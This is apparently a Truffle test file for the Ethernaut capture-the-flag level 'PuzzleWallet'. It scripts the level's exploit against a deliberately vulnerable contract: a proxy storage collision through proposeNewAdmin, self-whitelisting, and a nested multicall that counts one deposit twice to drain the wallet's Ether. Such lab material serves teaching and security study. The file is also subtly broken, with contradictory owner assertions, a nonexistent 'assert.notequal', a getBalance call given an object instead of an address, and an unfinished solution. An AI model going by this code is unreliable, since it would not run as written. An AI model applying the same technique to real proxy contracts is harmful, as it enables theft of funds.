const ethutil = require('ethereumjs-util')

const PuzzleProxy  = artifacts.require('PuzzleProxy');
const PuzzleWalletFactory = artifacts.require('PuzzleWalletFactory')
const PuzzleWallet = artifacts.require('PuzzleWallet')
const Ethernaut = artifacts.require('./Ethernaut.sol')

const { BN, constants, expectEvent, expectRevert } = require('openzeppelin-test-helpers')
const utils = require('../utils/TestUtils')

contract('PuzzleWallet', function(accounts) {

  let ethernaut
  let level
  let owner = accounts[1]
  let player = accounts[0]

  beforeEach(async function() {
    ethernaut = await Ethernaut.new();
    level = await PuzzleWalletFactory.new()
    await ethernaut.registerLevel(level.address)
  });

  it('should allow the player to solve the level', async function() {

    const instance = await utils.createLevelInstance(
      ethernaut, level.address, player, PuzzleWallet,
      {from: player, value: web3.utils.toWei('1', 'ether')}
    )

    assert.equal(await instance.owner(), level.address)
    assert.equal(web3.utils.toWei('1', 'ether'), (await instance.balances(level.address)).toString())
    
    // check that PuzzleProxy.pendingAdmin is factory
    assert.equal(owner, await instance.owner())

    const proxy = await PuzzleProxy.at(instance.address)
    await proxy.proposeNewAdmin(player)

    // check that the player has placed their address in the owner slot
    assert.equal(player, await instance.owner())

    // check that player is not whitelisted yet
    assert.notequal(true, await instance.whitelisted(player))

    // Player whitelists herself
    await instance.addToWhitelist(player, { from: player })

    const { data: depositData } = await instance.deposit.request(web3.utils.toWei('1', 'ether'))
    const { data: nestedMulticallData } = await instance.multicall.request([ depositData ])
    const { data: executeData } = await instance.execute.request(player, web3.utils.toWei('2', 'ether'), [])

    const calls = [
      depositData,
      nestedMulticallData,
      executeData,
    ]

    await instance.multicall(calls, { from: player, value: web3.utils.toWei('1', 'ether')})

    // check that PuzzleWallet.balance == zero
    assert.isZero(await web3.eth.getBalance(instance))

    // another step with dust?

    // Factory check
    const ethCompleted = await utils.submitLevelInstance(
      ethernaut,
      level.address,
      instance.address,
      player
    )
    assert.equal(ethCompleted, true)
  });
});
